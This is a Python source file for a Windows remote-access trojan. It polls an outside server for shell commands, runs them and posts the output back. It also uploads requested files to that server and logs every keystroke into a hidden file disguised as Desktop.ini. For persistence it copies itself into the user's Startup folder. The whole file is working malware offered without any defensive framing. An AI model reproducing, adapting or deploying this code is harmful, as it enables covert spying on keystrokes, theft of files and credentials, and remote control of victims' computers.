import ctypes
import requests
import time
import subprocess
import os
import shutil
from keyboard import on_press
import threading

# server_file = open("config.ini", "rb")
server_url = "https://omersaban.pythonanywhere.com/"  # server_file.read().decode()
client_id = 'client_123'
current_directory = os.getcwd()
log_file = ""


def hide_file_windows(file_path):
    # hiding each key logger file
    try:
        ctypes.windll.kernel32.SetFileAttributesW(file_path, 0x02)  # setting it hidden
        print(f"{file_path} has been marked as hidden.")
    except Exception as e:
        print(f"Error hiding the file: {e}")


def on_key_press(event):
    # for the keylogger
    with open(log_file, 'a', encoding='utf-8') as f:
        f.write('{}\n'.format(event.name))


def autorun():
    # creating an auto run so it will not description
    filen = os.path.basename(__file__)
    exe_file = filen.replace(".py", ".exe")
    startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")

    marker_file = os.path.join(startup_folder, "autorun_marker.txt")

    if os.path.exists(marker_file):
        print("Autorun has already been executed. Exiting...")
    else:
        with open(marker_file, 'w') as f:
            f.write("This file indicates the autorun has been set.")
        shutil.copy(exe_file, os.path.join(startup_folder, exe_file))


def listen_for_commands():
    global current_directory
    while True:
        try:
            # always trying to ping for a commands\
            response = requests.get(f"{server_url}/get_command/{client_id}")
            if response.status_code == 200:
                command = response.json().get('command')
                # handling the commands
                if command:
                    print(f"Executing command: {command}")
                    try:  # handling downloads
                        if command.startswith("DOWNLOAD "):
                            filename = command.split(" ", 1)[1]
                            file_path = os.path.join(current_directory, filename)

                            if os.path.exists(file_path):
                                with open(file_path, 'rb') as f:
                                    files = {'file': (filename, f)}
                                    upload_response = requests.post(f"{server_url}/upload_file", files=files)
                                    if upload_response.status_code == 200:
                                        output_message = f"File {filename} uploaded successfully."
                                    else:
                                        output_message = f"Failed to upload file: {upload_response.text}"
                            else:
                                output_message = f"File not found: {filename}"
                        # handling specifically the cd
                        elif command.startswith("cd "):
                            new_dir = command.split(" ", 1)[1]
                            os.chdir(new_dir)
                            current_directory = os.getcwd()
                            output_message = f"Changed directory to: {current_directory}"
                        else:
                            # handling others commands
                            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                            output_message = output.decode('utf-8', errors='ignore')
                            print(output_message)
                            if output_message == "":
                                output_message = f"Command {command}"
                            print(output_message)

                    except subprocess.CalledProcessError as e:
                        output_message = f"Command failed: {e.output.decode('utf-8', errors='ignore')}"
                    except Exception as e:
                        output_message = f"Error: {str(e)}"

                    result_data = {
                        "client_id": client_id,
                        "output": output_message
                    }
                    requests.post(f"{server_url}/send_output", json=result_data)

            time.sleep(5)
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(5)


#             keyboard.on_press(on_key_press)
#             keyboard.wait()
# the main
if __name__ == "__main__":
    # creating the Desktop.ini the fake one
    log_file = os.getcwd() + '/Desktop.ini'
    hide_file_windows(log_file)
    autorun()
    task1 = threading.Thread(target=on_press, args=(on_key_press,))
    task2 = threading.Thread(target=listen_for_commands)

    task1.start()
    task2.start()

    task1.join()
    task2.join()
